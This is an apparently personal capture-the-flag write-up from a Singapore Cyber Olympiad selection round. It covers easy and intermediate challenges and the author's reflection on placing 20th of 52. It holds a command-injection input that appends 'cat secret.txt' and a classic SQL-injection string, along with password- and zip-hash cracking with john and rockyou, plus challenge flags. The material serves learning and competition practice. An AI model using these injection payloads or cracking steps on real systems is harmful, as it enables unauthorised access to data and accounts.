# Singapore Cyber Oympiad 2nd Selection

Overall I think I did ... kinda below standard. Especially since I've worked for my OSCP and am currently working for my Burp Suite Certified Practitioner right now. 

I got 20th out of 52, which is above average. However, I feel it may still quite low in order to be selected, especially since I couldn't do 3 Easy challenges, and 1 Intermediate challenge. What was more frustrating is that I completed all the challenges I did within the first 45 minutes of the 2 hour selection, so I had time.

But oh well, I'll keep improving to get better. Maybe I'll get in next time!

![[scoreboard_2.png]]

# Easy


## Eggxcute
```
(base) [hacker@hackerbook tmp]$ chmod +x eggxecuteme 
(base) [hacker@hackerbook tmp]$ ./eggxecuteme 
flag{c730f03e9fbf9fd58bf84a2028a0a21e}
(base) [hacker@hackerbook tmp]$ 
```


## Basecamp

File given: base26.txt

Solution: Base64 decode the contents of the file

```bash
(base) [hacker@hackerbook blockcyber]$ echo "ZmxhZ3tjYmFkOWJhOWM2YzRlMTc4ODQyN2ZmZGU2OWZhOWQzNX0=" | base64 -d
flag{cbad9ba9c6c4e1788427ffde69fa9d35}(base) [hacker@hackerbook blockcyber]$ 
```

## Bestpinger

Obviously a command injection task

Input is `127.0.0.1; ls; cat secret.txt`

## Search Warrant

Obviously SQL

![[Pasted image 20221029164412.png]]

Solution is
```
0' OR 1=1; --
```

![[Pasted image 20221029164427.png]]

Flag is `1e2f826948bafe445735a9fe9376407d`

## ClearTel

Obviously Wireshark Follow Stream of `telnetLogin.pcapng`

![[Pasted image 20221029162632.png]]

```
pepeveryhandsome
```

## Filebin

I just checked the file, and changed the file extension

```
(base) [hacker@hackerbook tmp]$ file testresults.bin
testresults.bin: PNG image data, 300 x 300, 8-bit/color RGBA, non-interlaced
(base) [hacker@hackerbook tmp]$ cp testresults.bin t.jpg
(base) [hacker@hackerbook tmp]$ 
```

![Easy/t.jpg](Easy/t.jpg)

Flag: `Cnegative!`

# Intermediate

## Password Attack

Standard Linux Password cracking. The notable thing is that a dummy passwd file had to be created first

```bash
┌──(kali㉿kali)-[~]
└─$ echo "admin_user:$6$7LYU9cUOW22Imt83$2thOaEfwnm5vjaxWgIFh2My4F//QdwmUB16BGTXz1S9rTc7x7tesUO0vu/dRkvVukAG5VhiuRS8flkzpEtO0p/:1003:1003::/home/admin_user:/bin/sh" > passwd
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ unshadow passwd Passwd_Attack > hash                 
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
cookie1          (admin_user)
1g 0:00:00:00 DONE (2022-10-29 07:45) 2.857g/s 2925p/s 2925c/s 2925C/s football1..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## PortUp

I ran the binary, and connected to the service it started.

```bash
(base) [hacker@hackerbook blockcyber]$ ./portup3.bin 
Socket created
Socket bind complete
Socket now listening
Connected with 127.0.0.1:50908
```

I had to find the port it bound to using nmap first though

```bash
(base) [hacker@hackerbook ~]$ nmap -sT 127.0.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-29 16:59 +08
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000094s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT      STATE SERVICE
631/tcp   open  ipp
65000/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
(base) [hacker@hackerbook ~]$ 
(base) [hacker@hackerbook ~]$ nc 127.0.0.1 65000
flag{b30363fab42cf3a08fdfc45b3472c5ee}

```

## SharkChat

Didn't solve this, but need to 

![[Pasted image 20221029163842.png]]

PDF analysis is weird

```bash
base) [hacker@hackerbook blockcyber]$ /home/hacker/.local/bin/peepdf secret.pdf 
Error: An error has occurred while parsing an indirect object!!
(base) [hacker@hackerbook blockcyber]$ ls
Dict_Crack.zip  elephant.txt  portup_linux_64.bin  sharkchat.pcapng
eggxecuteme     portup3.bin   secret.pdf           test
(base) [hacker@hackerbook blockcyber]$ /home/hacker/.local/bin/peepdf /run/media/hacker/2A208D6B208D3EB7/Users/zunmu/Pictures/NUS\ University\ Scholars\ Programme\ Online\ Application.pdf 
Warning: PyV8 is not installed!!
Warning: pylibemu is not installed!!

File: NUS University Scholars Programme Online Application.pdf
MD5: 873d3e9899210a983156b5d57d245d4f
SHA1: 4026c19b4dafb860b9f3c54788c32ca44cabd2df
SHA256: 68376b1a95e5feb2b663195bc4c89ded0717866b855d2b14e3637cb971991aa8
Size: 95154 bytes
Version: 1.4
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 114
Streams: 8
URIs: 1
Comments: 0
Errors: 1

Version 0:
	Catalog: 102
	Info: 1
	Objects (114): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114]
	Streams (8): [6, 10, 103, 106, 107, 110, 111, 114]
		Encoded (8): [6, 10, 103, 106, 107, 110, 111, 114]
		Decoding errors (8): [6, 10, 103, 106, 107, 110, 111, 114]
	Objects with URIs (1): [9]
	Suspicious elements:
		/Names (1): [100]



(base) [hacker@hackerbook blockcyber]$ 
(base) [hacker@hackerbook blockcyber]$ /home/hacker/.local/bin/peepdf secret.pdf -f
Warning: PyV8 is not installed!!
Warning: pylibemu is not installed!!

File: secret.pdf
MD5: 991f187dd2a97bd26b24b0795b5853d0
SHA1: d56e80ae5fdf423c6a88acda8b0a8e1c03383cd9
SHA256: d0899a6ec68d9cd8c61748648485448a7f12c29c5d8bedd2c2d97bbc1c530e77
Size: 47004 bytes
Version: 1.7
Binary: False
Linearized: False
Encrypted: False
Updates: 1
Objects: 15
Streams: 5
URIs: 0
Comments: 0
Errors: 2

Version 0:
	Catalog: 1
	Info: 9
	Objects (15): [1, 2, 3, 4, 5, 6, 7, 8, 9, 17, 20, 21, 22, 23, 24]
		Errors (4): [4, 17, 21, 24]
	Streams (5): [4, 17, 21, 22, 24]
		Xref streams (1): [24]
		Object streams (1): [17]
		Encoded (4): [4, 17, 21, 24]
		Decoding errors (4): [4, 17, 21, 24]

Version 1:
	Catalog: 1
	Info: 9
	Objects (0): []
	Streams (0): []


(base) [hacker@hackerbook blockcyber]$
```

## HardCrack

Just cracking a zip file using john the ripper

```bash
┌──(kali㉿kali)-[/tmp]
└─$ zip2john Dict_Crack.zip > hash 
ver 2.0 efh 9901 Dict_Crack.zip/flag1.txt PKZIP Encr: cmplen=45, decmplen=15, crc=0
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
likeavirgin      (Dict_Crack.zip/flag1.txt)
1g 0:00:00:02 DONE (2022-10-29 05:01) 0.3759g/s 47735p/s 47735c/s 47735C/s money89..327327
Use the "--show" option to display all of the cracked passwords reliably
Session completed
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$
```

unzip, file inside should be `flag1.txt` which is

```
P@ssw0rdCracker
```

